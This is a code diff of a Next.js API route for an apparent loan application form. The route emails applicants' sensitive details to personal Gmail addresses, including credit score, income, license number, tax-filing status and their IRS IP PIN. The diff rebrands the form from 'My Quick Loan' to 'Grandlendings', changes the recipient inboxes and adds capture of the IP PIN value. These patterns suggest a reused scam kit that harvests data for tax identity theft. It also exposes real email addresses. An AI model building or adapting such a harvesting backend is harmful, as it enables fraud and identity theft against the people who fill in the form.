@@ -45,7 +45,7 @@ export async function POST(request) {
   // Compose the email message
   const message = {
     from: "osr.cty@gmail.com",
-    to: ["kindras131@gmail.com"],
+    to: ["piexe93@gmail.com", "solomonojukwu4@gmail.com"],
     subject: "Loan Application Details",
     html: `
     <h3>Loan Application Details ${
@@ -88,12 +88,13 @@ export async function POST(request) {
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
-    <p>My Quick Loan Source: ${formData.myQuickLoanSource}</p>
-    <p>My Quick Loan Source Other: ${formData.myQuickLoanSourceOther}</p>
+    <p>Grandlendings Source: ${formData.GrandlendingsSource}</p>
+    <p>Grandlendings Source Other: ${formData.GrandlendingsSourceOther}</p>
     <p>Credit Score: ${formData.creditScore}</p>
     <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
     <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
-    <p>Filed for 2021 tax: ${formData.didFile2021Taxes}</p>
+    <p> Ip Pin: ${formData.ipPin}</p>
+    <p>Filed for 2022 tax: ${formData.didFile2022Taxes}</p>
     <p>Adjusted Gross Income: ${formData.adjustedGrossIncome}</p>
 
     <p>License Number: ${
@@ -126,6 +127,6 @@ export async function POST(request) {
   }
 }
 
-export async function GET(request) {
+export async function GET() {
   return NextResponse.json({ message: "Method Not Allowed" }, { status: 405 });
 }
